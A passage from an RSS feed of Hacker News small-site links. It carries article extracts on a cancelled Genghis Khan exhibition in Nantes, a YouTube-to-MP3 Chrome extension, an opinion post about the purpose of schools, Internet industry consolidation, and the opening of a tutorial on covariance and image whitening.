        </div><p>The “Genghis” exhibition had <a href="http://www.china.org.cn/arts/2017-02/17/content_40319782.htm" target="_blank">positive reviews</a>, even from China’s state-controlled Xinhua News Agency which said that the Dutch exhibition provided&nbsp;new insights&nbsp;into Genghis Khan.</p><p>The idea was that Ghengis&nbsp;would&nbsp;continue conquer the world, this time as a travelling exhibition.</p><p>But that hasn’t happened – yet.</p><p>After some years of preparation, Genghis was scheduled to arrive&nbsp;in the History Museum of Nantes, France, at the <a href="http://www.chateaunantes.fr/en/" target="_blank">Chateau des ducs de Bretagne</a>. The exhibition, entitled&nbsp;"Son of heaven and the steppes - Genghis Khan and the birth of the Mongol empire" was to have opened on 17 October.</p><h2><strong>Biased rewriting</strong></h2><p>On 13 October, the museum suddenly announced that the exhibition was cancelled. It said that authorities of the Chinese Cultural Affairs Bureau wanted to change the exhibition’s title, taking out the words “Genghis Khan,” “empire” and "Mongol”.</p><p>Bertrand Guillet, Director of the museum, said in a <a href="http://www.chateaunantes.fr/expositions/fils-du-ciel-et-des-steppes/" target="_blank">statement</a> that the Chinese also wanted “control over all our productions, texts, maps, the catalogue, press releases.”</p>                
    <p>An&nbsp;edit, proposed by Beijing “included biased rewriting aimed at completely erasing Mongolian history and culture in favor of a new national narrative,” according to Guillet.</p><p>The exhibition is now planned to open in 2024, with artefacts provided by other, non-Chinese, museums.</p><h2><strong>No room for Mongolian nationalism</strong></h2><p>Guillet has reason to worry. <a href="http://www.nmgbwy.com/" target="_blank">The homepage</a> of the Inner Mongolia Museum’s website opens with an eye-catching red-and-yellow banner featuring not Mongolian artifacts but the Forbidden City in Beijing, a section of the Great Wall, and the text “<em>Follow the Party Forever, Together Build the Chinese Dream</em>,” a slogan coined by Xi Jinping.&nbsp;Everything is dominated by Han Chinese, and nothing initially points at Mongol culture.</p>

    <a href="http://www.nmgbwy.com/">
                    
<figure>
    <p><img src="https://s.rfi.fr/media/display/0c3ea8fe-0ef9-11eb-b94f-005056a98db9/2020-10-15%20Screengrab%20Inner%20Mongolia%20Museum%20website.jpg" alt="Screengrab from the Inner Mongolia Museum in Hohhot. The text reads &quot;forever follow the party, together build the Chinese dream.&quot;" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/0c3ea8fe-0ef9-11eb-b94f-005056a98db9\/&quot;,&quot;filename&quot;:&quot;2020-10-15 Screengrab Inner Mongolia Museum website.jpg&quot;,&quot;ratio&quot;:&quot;p:16x9&quot;,&quot;displayFormat&quot;:&quot;original&quot;}">
    </p>
                        <figcaption>
                <span>Screengrab from the Inner Mongolia Museum in Hohhot. The text reads "forever follow the party, together build the Chinese dream."</span>                <span>© Screengrab Neimenggu Bowuyuan (Inner Mongolia Museum)</span>            </figcaption>
            </figure>

        </a><p>A page deep inside the website&nbsp;does show an <a href="http://mp.weixin.qq.com/s?__biz=MzA3ODg5MzIzNg==&amp;mid=2650188643&amp;idx=1&amp;sn=a2297b678fd010a0b7634cf9072b9262&amp;chksm=87b9d2b8b0ce5baec6967abfdece06f16a056af1fffdb6c5735ef9a625516d152aaada64f82b&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1581479331874&amp;sharer_sh?contentId=1713" target="_blank">extensive history</a> of the Mongols, illustrated by a video presentation of the museum’s “explainer” Buhe Chaolu, an ethnic Mongolian himself. The exhibition, here called <em>Tianjiao Menggu</em> (“Heavenly, Proud Mongolia”) – carries no initial references to Genghis Khan or his vast empire.</p><p>Later, the text does refer to how Genghis Khan “founded the great Mongol empire” which conquered China and founded the Yuan Dynasty (1271-1368).</p><h2><strong>Brutal control</strong></h2><p>But the story stops there, without a single reference to how Mongolia was conquered by the non-Chinese Qing dynasty (who were Manchurian). There is no explanation of&nbsp;how Outer Mongolia split off after the 1911 revolution, nor of how the Chinese Communist Party brutally re-established control over the territory called the “Inner Mongolia Autonomous Region,” moving Han-Chinese to Mongolian lands so that Mongols are now a minority in their own territory.</p><p>Recently, China seems to have hardened its policy towards its minorities. Last month, Mongolians in the Chinese&nbsp;Autonomous Region&nbsp;of Inner Mongolia <a href="https://www.rfi.fr/en/international/20200909-chinese-minorities-fear-beijing-s-efforts-to-stamp-out-local-languages-cultures" target="_self">demonstrated</a> against government plans to strengthen Chinese language education at the expense of their native Mongolian.</p>

    <div>
                    
<figure>
    <p><img src="https://s.rfi.fr/media/display/e88e5cfc-f750-11ea-a1cb-005056a964fe/a07da3727fe51261e3d8c31758cc241734379f19.jpg" alt="Mongolians in the capital Ulaanbaatar protest against Beijing's plan to introduce Mandarin-only classes at schools in the Chinese province of Inner Mongolia" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/e88e5cfc-f750-11ea-a1cb-005056a964fe\/&quot;,&quot;filename&quot;:&quot;a07da3727fe51261e3d8c31758cc241734379f19.jpg&quot;,&quot;ratio&quot;:null,&quot;displayFormat&quot;:&quot;original&quot;}">
    </p>
                        <figcaption>
                <span>Mongolians in the capital Ulaanbaatar protest against Beijing's plan to introduce Mandarin-only classes at schools in the Chinese province of Inner Mongolia</span>                <span>AFP</span>            </figcaption>
            </figure>

        </div><p>Tibetan and Uyghur areas have also complained of a shift in language education -&nbsp; a direct result of current Party Secretary Xi Jinping's apparent attempts to integrate China's minorities with the dominant Han-Chinese by means of "ethnic contact, exchange and blending," a catchphrase initially invented by Xi's predecessor Hu Jintao, but today made into a national policy intended to further subject the minorities - in some cases, as in Xinjiang, <a href="https://www.rfi.fr/en/asia/20200219-new-xinjiang-leaks-detail-china-s-massive-detention-system-uyghurs" target="_self">by brute force</a>.</p><p>Beijing’s attempts to influence presentations like the Genghis exhibition in Nantes indicate that China’s minority policy is now expanding beyond its borders.</p>
                                            
    
                </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079764</guid>
            <pubDate>Fri, 13 Nov 2020 07:03:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OS108-9.1 XFCE amd64 released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25079641">thread link</a>) | @todsacerdoti
<br/>
November 12, 2020 | https://forums.os108.org/d/32-os108-91-xfce-amd64-released | <a href="https://web.archive.org/web/*/https://forums.os108.org/d/32-os108-91-xfce-amd64-released">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://forums.os108.org/d/32-os108-91-xfce-amd64-released</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079641</guid>
            <pubDate>Fri, 13 Nov 2020 06:39:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Client-side YouTube to MP3 using ffmpeg.js in a Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079455">thread link</a>) | @benkaiser
<br/>
November 12, 2020 | https://benkaiser.github.io/youtube-to-mp3/ | <a href="https://web.archive.org/web/*/https://benkaiser.github.io/youtube-to-mp3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        A server-less chrome extension to convert youtube videos to mp3 files for download. If available, files are persisted to <a href="https://siasky.net/">Sia SkyNet</a> for future downloads by all users.
      </p>
      <p>This Youtube to MP3 chrome extension is different in a few ways:
        </p><ol>
          <li>The conversion takes place on your machine, not a server, so there's no server costs we need to cover with ads</li>
          <li>The conversion logic exists on your machine, and is resilliant to takedowns</li>
          <li>Your conversions are cached with <a href="https://siasky.net/">Sia SkyNet</a> for quick download without conversion in the future by everyone</li>
          <li>This extension <a href="https://github.com/benkaiser/youtube-to-mp3">is open source</a> and available for you to inspect the integrity of it yourself</li>
        </ol>
      
      <h2>Installation</h2>
      <div>
        <div>
          <p>
            <a href="https://benkaiser.github.io/youtube-to-mp3/extension.zip">Download Extension Zip</a>
          </p>
          <p>
            Steps to Install:

            </p><ol>
              <li>Download extension zip file and unzip</li>
              <li>Navigate to chrome://extensions in your browser</li>
              <li>Enable developer mode in the top right</li>
              <li>Click "Load unpacked" in the top left</li>
            </ol>
          
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/instructions.png" alt="instructions picture">
        </p>
      </div>
      <h2>Usage</h2>
      <div>
        <div>
        <p>
          Just navigate to any youtube video and click the "Download MP3" button next to the Subscribe button.
        </p>
        <p>
          If the file has not yet been converted, your machine will download the youtube video and convert it to an mp3. This process may take 30+ seconds depending on video size, your internet connection and your computers processing power. Once the file is converted a download will trigger on your browser for the file.
        </p>
        <p>
          If someone has previously converted the video to mp3 using the extension already, the download will start in just a few seconds.
        </p>
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/usage.gif" alt="using youtube to mp3">
        </p>
      </div>
    </div></div>]]>
            </description>
            <link>https://benkaiser.github.io/youtube-to-mp3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079455</guid>
            <pubDate>Fri, 13 Nov 2020 06:13:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The True Purpose of Schools]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25079113">thread link</a>) | @dchacke
<br/>
November 12, 2020 | https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html | <a href="https://web.archive.org/web/*/https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The other day, it “clicked” for me: I think I understand better now what schools are really for.</p>

<p>It is generally believed that schools exist to help children learn. Of course, we critical rationalists know that that’s baloney. Instead, we understand—thanks to <em>Taking Children Seriously</em>—that schools exist to <em>standardize</em> children: to get them to replicate society’s memes as faithfully as possible under threat of punishment. Static-society stuff (cf. David Deutsch, <a href="https://www.amazon.com/Beginning-Infinity-Explanations-Transform-World/dp/0143121359/"><em>The Beginning of Infinity</em></a>). At least that was my current understanding of it. But I’m starting to see that it goes deeper than that.</p>

<p>Consider a child who is interested in, say, astronomy. Most elementary schools do not offer astronomy classes. And even if they did, it is highly unlikely that any given child would happen to be interested in <em>all</em> of the things that are shoved down his throat year after year, at just the right time. A child’s interests don’t evolve in sync with the school’s schedule. If the child is lucky, he will be genuinely interested in a few of the topics any given year, but never even close to all of them.</p>

<p>So, the child wants to learn about astronomy—but doesn’t get to. Instead, he is forced to learn <em>other</em> things he <em>isn’t</em> interested in. Day in, day out, for  some 12 years. As Popper said, he has to learn answers to questions he didn’t ask.</p>

<p>A child is then faced with two options: to go insane, or to learn to cope with the situation. So, what can one possibly <em>do</em> in such a situation to stay sane? I see only one solution: one must learn to put one’s <em>own</em> interests on the back burner and prioritize <em>other people’s</em> interests—in this case, the teacher’s, and society’s at large. One must learn to coerce oneself to neglect one’s preferences. I think <em>that</em> is what school is really for: not just to standardize children, but to break them, too, to place others’ interests over their own.</p>

<p>I recently asked a 14 year old close to me if she’d like to go to college. She said no, but that she probably will anyway because she thinks she <em>should</em>. It’s heartbreaking.</p>

<p>It is only after 12 years of mind-numbing boredom and neglecting one’s preferences that people voluntarily spend the next 30, 40, sometimes 50 years at jobs they hate. Forever delaying their dreams is what they’re good at. It is in school that they learn how to live with problems and endure them instead of <em>solving</em> them. It is there that they are taught that their interests have no chance of leading to anything fruitful, so they shut them down quickly.</p>

<p>Parents are often complicit in this. E.g., they take away things that their children enjoy, such as their computers, gameboys, etc, or at least put time limits on them—so that their kids spend less time doing what they <em>want</em> and more of what they allegedly <em>need</em>, which is determined by anyone but the child.</p>

<p>I’m thankful that David Deutsch puts emphasis on <em>fun</em> and <em>interests</em>. They’re hugely underrated.</p>

<p>If school’s main purpose is to teach children how to neglect their own interests and instead pursue other people’s interests, that also explains where <em>altruism</em> comes from—the evil doctrine Rand so eloquently refuted and which, she says, “regards man, in effect, as a sacrificial animal,” quoting Auguste Comte, who coined the term “to mean, specifically, the placing of the interests of others above your own.” (see the YouTube video at the bottom)</p>

<h2>
  The true purpose of schools is to turn children—born individualists—into altruists; to systematically neglect their own interests in favor of others' interests.
</h2>

<p>It is to force children to betray their intellectual integrity. They must “sacrifice [their minds] to what <em>others</em> believe or want to be true.” — Ayn Rand (though she didn’t state this in the context of schooling and children in particular, but society at large)</p>

<p>This true purpose explains why people <em>live for others</em>, and then expect others to do so as well. It’s what they were forced to do during the most formative years of their lives after all!</p>

<p>It explains why so many expect their peers to sacrifice their happiness for the health of others by agreeing to house arrests. Why those who don’t want their salaries to be cut in half by taxes are considered “evil.” Why so many can’t begin to imagine a world without coercion. “If I had to do it, why should anyone else get a free pass?”</p>

<p>I’m guessing that most teachers do not understand this true purpose of school. They become teachers because <a href="https://blog.dennishackethal.com/2020/10/25/the-tragedy-of-children-becoming-teachers.html">they want to “help” children</a>—that is, give children what they allegedly “need.” It is only altruists who can become teachers and perpetuate the cycle. In other words, the memeplex of schools depends on breaking children so successfully that some of them decide to continue the tradition. Not only do teachers not know why they’re contributing to this altruism machine, <em>it relies on teachers not understanding its true nature to keep itself alive.</em> This makes me wonder if schools as a whole are static memeplexes.</p>

<p>I think many experienced critical rationalists, on the other hand, understand school’s true purpose deeply. For me, it was a breakthrough. Though the topic is sad, writing this post was fun. A lot of stuff is beginning to make more sense. I’m pursuing my interests <em>right now</em>. I love critical rationalism.</p>

<p>
  <iframe src="https://www.youtube-nocookie.com/embed/7RFlPmjUbRo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079113</guid>
            <pubDate>Fri, 13 Nov 2020 05:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bassam Kurdali on using Blender for open movie productions and education]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078788">thread link</a>) | @pabs3
<br/>
November 12, 2020 | https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html | <a href="https://web.archive.org/web/*/https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span>FOSS and Crafts</span> -- Thu 12 November 2020</p><div><p><a href="https://urchn.org/">Bassam Kurdali</a>
(<a href="https://mastodon.social/@bkurdali">Fediverse</a>, <a href="https://twitter.com/bkurdali">Twitter</a>)
talks about using <a href="https://www.blender.org/">Blender</a>
(a free and open source software suite for making 3d artwork)
for open movie projects such as <a href="https://orange.blender.org/">Elephants Dream</a>
(the world's first open movie project, which Bassam directed!)
and <a href="https://wiresforempathy.org/">Wires for Empathy</a>,
as well as use in teaching it to college students studying animation.</p><p><strong>Links:</strong></p><ul><li><a href="https://www.blender.org/">Blender</a></li><li><a href="https://urchn.org/">Urchin studios</a></li><li>Chicken Chair (we need a better link for this... check back later!)</li><li><a href="https://orange.blender.org/">Elephants Dream</a></li><li><a href="https://wiresforempathy.org/">Wires for Empathy</a> (aka "Tube")</li><li><a href="https://opentoonz.github.io/e/">OpenToonz</a></li><li><a href="https://www.charlielee.uk/boats-animator/">Boats Animator</a></li><li><a href="https://natrongithub.github.io/">Natron</a></li><li><a href="https://www.hampshire.edu/">Hampshire College</a></li><li><a href="https://www.risd.edu/">Rhode Island School of Design (RISD)</a></li><li><a href="https://cloud.blender.org/p/gallery/57e507b80fcf29412d1f1e53">Blender splash screens gallery</a></li></ul></div></div></div></div></div>]]>
            </description>
            <link>https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078788</guid>
            <pubDate>Fri, 13 Nov 2020 04:13:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Backbone: Conclusion]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078667">thread link</a>) | @cfmcdonald
<br/>
November 12, 2020 | https://technicshistory.com/2020/11/13/the-backbone-conclusion/ | <a href="https://web.archive.org/web/*/https://technicshistory.com/2020/11/13/the-backbone-conclusion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>And so we reach the conclusion of “The Backbone,” my story of the origins of the Internet<a href="#fn1" id="fnref1"><sup>1</sup></a>. We have seen the basic arc of the Internet’s development from the 1960s to the 1990s – nurtured in its youth by the government, given room to grow to fruition by the unravelling of the power of the Bell system, and finally emerging into public view in a frenzy of growth which smothered all potential competitors. Over the course of those decades, users repeatedly co-opted systems built in order to expand and share access to machine resources (time-sharing operating systems, ARPANET, and NSFNET), to use them instead for interpersonal communication – message boards and electronic mail.</p>
<p>In 1995, the National Science Foundation (NSF) successfully extricated itself from the network operations business while preserving a single, unitary Internet, composed of many heterogeneous but interlaced parts – networks owned by a variety of corporations; and websites and other services provided by an even wider variety of participants: hobbyists, local governments, small businesses, and more.</p>
<p>The Internet’s self-image coalesced in these years of its adolescence. It was distributed, decentralized, and decentralizing. Its most vocal proponents argued that its technological structure, which privileged the edges over the center, would replicate itself in new political structures, eroding the foundations of incumbent institutional power and enabling direct, disintermediated communication and market transactions between individuals. Louis Rossetto, editor of <em>Wired</em>, <em>the</em> magazine of the technologically-enlightened, put it this way:</p>
<blockquote>
<p>This new world is characterized by a new global economy which is inherently anti-hierarchical and decentralist, and disrespects national boundaries or the control of politicians and bureaucrats or power mongerers of any; and by a global, networked consciousness that is creating a new kind of democracy for achieving social consensus that is turning the bankrupt electoral politics we are witnessing this year into a dead end. …a global hive mind that is arriving at a new, spontaneous order<a href="#fn2" id="fnref2"><sup>2</sup></a>.</p>
</blockquote>
<p>This set of libertarian ideas found expression in statements repeated and replicated so often that they became a kind of scripture of the Internet: the book of David Clark (“We reject: kings, presidents, and voting. We believe in: rough consensus and running code.”); the book of John Perry Barlow (“Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. ….You are not welcome among us. You have no sovereignty where we gather.”); the book of John Gilmore (“The Net interprets censorship as damage and routes around it.”).</p>
<p>These ideas took root, as I have said, when the Internet remained yet in its adolescent state – simultaneously a single, interconnected system, yet robustly heterogeneous in its structure at every level. Over the following fifteen years, its heterogeneity would diminish, with power over the network and its applications consolidating in a few key corporations<a href="#fn3" id="fnref3"><sup>3</sup></a>.</p>
<h2 id="boom-networks-consolidate">Boom: Networks Consolidate</h2>
<p>As the popularity of the Internet exploded in the second half of the 1990s, a river of capital flowed into Silicon Valley in search of the huge returns promised by the unheard of yearly growth of digital traffic. The theory of the time held that, because of the global reach of the Internet and the power of network effects (e.g., Metcalfe’s Law), the first mover to occupy any given sector of online business would dominate it. According to this doctrine, short-term losses – even on per-unit sales basis – were irrelevant, even desirable. Only growth mattered, because growth could always be turned into profits later, once all potential competitors had dwindled into irrelevance<a href="#fn4" id="fnref4"><sup>4</sup></a>. This encouraged a gold rush mentality among investors, what we would now call FOMO, and attracted large amounts of money to such questionable enterprises as Priceline, Boo, and eToys, despite their evident lack of profitability.</p>
<p>Underneath this highly visible froth of increased application diversity, however, the deep current of network infrastructure flowed in the opposite direction, towards consolidation. The boom in web properties in the second half of the 1990s found its echo in a boom in fiber optic network construction. The telecom carriers, new and old, all wanted a piece of the exponential growth in data traffic promised by the rocket-like rise of the World Wide Web. The incumbent telecommunications carriers, freed from their silos by the 1996 Telecom Act, did not, as might have been hoped, use the opportunity to unleash their claws in all-out competitive battle, cutting profits to the bone to the benefit of their users. Markets may thrive on competition, but firms much prefer monopoly. And so the RBOCs and long-distance carriers, split apart in 1984, re-assembled themselves into giants with tremendous market power. Southwestern Bell absorbed Ameritech, Pacific Telesis, BellSouth, and finally AT&amp;T, and then took the name of that former parent company. Bell Atlantic and NYNEX merged, then acquired GTE<a href="#fn5" id="fnref5"><sup>5</sup></a>, taking on at the same time a new moniker, Verizon. Of the former RBOCs, only US West remained an independent company.</p>
<p>While Southwestern Bell and Bell Atlantc re-assembled the scattered parts of AT&amp;T into a pair of Frankenstein’s monsters, another would-be giant was busy absorbing the various internet service providers that had flourished in the first half of the 1990s. In 1983, Bernie Ebbers, who had made his first fortune as the owner of a dozen hotels, co-founded Long Distance Discount Services (LDDS) to compete in the market newly opened by the AT&amp;T break-up, targeting long-distance service for small and medium-sized businesses. Over the ensuing decade, LDDS acquired a variety of other competitors, achieving fourth place in size among long-distance carriers behind AT&amp;T, MCI, and Sprint. In the first days of the Internet boom, it took on a new name – WorldCom – thus announcing its newly hubristic ambitions. A new, much more extravagant buying spree ensued, using WorldCom’s its bubble-inflated stock to acquire one major network after another. In 1996, it bought Metropolitan Fiber Systems (MFS), which had itself just acquired major Internet provider UUNET. The acquisition of CompuServe’s network infrastructure from H&amp;R block followed in 1997, along with the acquisition of the former NSFNET backbone operator, ANS, from AOL. The biggest purchase of all came in 1998, when WorldCom merged with MCI. After the market crash – and bankruptcy and scandal and prison<a href="#fn6" id="fnref6"><sup>6</sup></a> – Verizon absorbed the wreckage of Bernie Ebbers’ conglomerate in 2006.</p>
<p>Finally, the cable television providers, though more historically localized in ownership than the rest of the telecom business, underwent a similar trend towards consolidation, with acquisitions across previously siloed markets making possible behemoths like Time Warner and Comcast; the latter became simultaneously the largest internet service provider and the largest pay-TV company in the U.S., to say nothing of its media holdings.</p>
<p>And so, by the mid-2000s, the diverse structure of peer networks which had characterized the early Internet in the U.S. had merged into a handful of major providers. At the retail level, as broadband networking replaced dial-up, most consumers had access to only one or two relevant ISPs – their local telephone and cable company – and nationally two companies dominated each of those sectors; Verizon and AT&amp;T on the one hand, and Comcast and Time Warner on the other.</p>
<h2 id="bust-applications-consolidate">Bust: Applications Consolidate</h2>
<p>Many of the first-generation dot-coms might have survived had they been allowed to grow gradually. But the gold rush theory was antithetical to anything but hypergrowth. So, when the crash came, most were caught with huge expenses and excess capacity due to overinvestment, and they quickly collapsed. A vigorous winnowing took place, with a great deal of chaff sifted out and only a few grains of wheat left behind.</p>
<p>Over the following decade, a new much more stable order emerged. Five giant companies came to dominate the application layer of the Internet. Two of them were dot-com era survivors. Google, founded in 1998, had raised the bar on what it meant to be a search engine by extracting ranking information from the structure of the Web and its skein of links, rather than merely from the content of individual pages. Through a series of further innovations and acquisitions, it leveraged its dominance in search into a powerful position in mobile computing, email, streaming video, and, of course, advertising. Amazon, founded as a book retailer in 1994, developed a world-beating logistical operation which it used to undercut competitors on price and delivery speed, then expanded into virtually every retail sector, and finally created a set of tools for hosting third-party applications that defined the new, and very lucrative, business of cloud computing.</p>
<p>Two of the other giants had come of age during the personal computing era, a decade before the commercial Internet. Microsoft took an early lead in the so-called “browser wars” of the mid-90s, but more important long-term was its continued dominance of business software, even as those businesses began to move their operations on-line. Apple Computer, made largely irrelevant in the 1990s by the dominance of Windows, seemed destined to a gradual decline into senescence. But it was rejuvenated by its successes with the iPod and iTunes, and then developed the most profitable mobile computing device to this day, the iPhone.</p>
<p>The final dominant power, Facebook, was the only one to come out of the second wave boom in Internet investment in the second half of the 2000s. It grew rapidly across college campuses before colonizing the wider world, and becoming the primary way that many millions of people keep in touch with people outside their immediate family and close friends. It has since acquired other …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://technicshistory.com/2020/11/13/the-backbone-conclusion/">https://technicshistory.com/2020/11/13/the-backbone-conclusion/</a></em></p>]]>
            </description>
            <link>https://technicshistory.com/2020/11/13/the-backbone-conclusion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078667</guid>
            <pubDate>Fri, 13 Nov 2020 03:55:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What if you tried to catch a 1000 MPH baseball? [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078082">thread link</a>) | @rmason
<br/>
November 12, 2020 | https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more | <a href="https://web.archive.org/web/*/https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                                                                                <p>Just hit play. It's timestamped.</p><mediatag id="40379"></mediatag><p>td;dw: You would die. Expeditiously.</p>
                                    <!--                                 <p>
                    <span class="text-muted text-sm">Last Updated Nov 14th, 2020 at 2:47 am</span>
                </p>
                 -->
            </div>
        </div></div>]]>
            </description>
            <link>https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078082</guid>
            <pubDate>Fri, 13 Nov 2020 02:19:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pre-processing for deep learning: from covariance matrix to image whitening]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078004">thread link</a>) | @sebg
<br/>
November 12, 2020 | https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/ | <a href="https://web.archive.org/web/*/https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> Essential Math for Data Science</p><p>I just released my book "Essential Math for Data Science"🎉.<br> Get it before the 30th of November 2020 and benefit from a <b>HUGE DISCOUNT</b>!</p><p><a href="https://www.essentialmathfordatascience.com/"> <b>GET THE BOOK</b> </a></p></div><p><a href="https://www.essentialmathfordatascience.com/"> <img src="https://hadrienj.github.io/assets/images/cover.jpg" width="40%"> </a></p></div><p><em>Last update: Jan. 2020</em></p><p>A notebook version of this post can be found <a href="https://github.com/hadrienj/Preprocessing-for-deep-learning">here</a> on Github.</p><p>The goal of this post/notebook is to go from the basics of data preprocessing to modern techniques used in deep learning. My point is that we can use code (Python/Numpy etc.) to better understand abstract mathematical notions! Thinking by coding! 💥</p><p>We will start with basic but very useful concepts in data science and machine learning/deep learning like variance and covariance matrix and we will go further to some preprocessing techniques used to feed images into neural networks. We will try to get more concrete insights using code to actually see what each equation is doing!</p><p>We call preprocessing all transformations on the raw data before it is fed to the machine learning or deep learning algorithm. For instance, training a convolutional neural network on raw images will probably lead to bad classification performances (<a href="https://ieeexplore.ieee.org/document/7808140/">Pal &amp; Sudeep, 2016</a>). The preprocessing is also important to speed up training (for instance, centering and scaling techniques, see <a href="http://yann.lecun.com/exdb/publis/pdf/lecun-98b.pdf">Lecun et al., 2012; see 4.3</a>).</p><p>Here is the syllabus of this tutorial:</p><ol><li><p><strong>Background</strong>: In the first part, we will get some reminders about variance and covariance and see how to generate and plot fake data to get a better understanding of these concepts.</p></li><li><p><strong>Preprocessing</strong>: In the second part, we will see the basics of some preprocessing techniques that can be applied to any kind of data: mean normalization, standardisation and whitening.</p></li><li><p><strong>Whitening images</strong>: In the third part, we will use the tools and concepts gained in 1. and 2. to do a special kind of whitening called Zero Component Analysis (ZCA). It can be used to preprocess images for deep learning. This part will be very practical and fun ☃️!</p></li></ol><p>Feel free to fork the notebook. For instance, check the shapes of the matrices each time you have a doubt :)</p><h2 id="a-variance-and-covariance">A. Variance and covariance</h2><p>The variance of a variable describes how much the values are spread. The covariance is a measure that tells the amount of dependency between two variables. A positive covariance means that values of the first variable are large when values of the second variables are also large. A negative covariance means the opposite: large values from one variable are associated with small values of the other. The covariance value depends on the scale of the variable so it is hard to analyse it. It is possible to use the correlation coefficient that is easier to interpret. It is just the covariance normalized.</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/negative-and-positive-covariance.png" width="500" alt="Intuition about the covariance between two variables" title="Representation of the covariance between two variables."> <em>A positive covariance means that large values of one variable are associated with big values from the other (left). A negative covariance means that large values of one variable are associated with small values of the other one (right).</em></p><p>The covariance matrix is a matrix that summarizes the variances and covariances of a set of vectors and it can tell a lot of things about your variables. The diagonal corresponds to the variance of each vector:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance1.png" width="400" alt="Variance in the matrix of covariance" title="Variance in the matrix of covariance is on the diagonal"> <em>A matrix $\bs{A}$ and its matrix of covariance. The diagonal corresponds to the variance of each column vector.</em></p><p>Let’s just check with the formula of the variance:</p><p>$ V(\bs{X}) = \frac{1}{n}\sum_{i=1}^{n}(x_i-\bar{x})^2 $</p><p>with $n$ the length of the vector, and $\bar{x}$ the mean of the vector. For instance, the variance of the first column vector of $\bs{A}$ is:</p><p>$ V(\bs{A}_{:,1}) = \frac{(1-3)^2+(5-3)^2+(3-3)^2}{3} = 2.67 $</p><p>This is the first cell of our covariance matrix. The second element on the diagonal corresponds of the variance of the second column vector from $\bs{A}$ and so on.</p><p><em>Note</em>: the vectors extracted from the matrix $\bs{A}$ correspond to the columns of $\bs{A}$.</p><h3 id="covariance">Covariance</h3><p>The other cells correspond to the covariance between two column vectors from $\bs{A}$. For instance, the covariance between the first and the third column is located in the covariance matrix as the column 1 and the row 3 (or the column 3 and the row 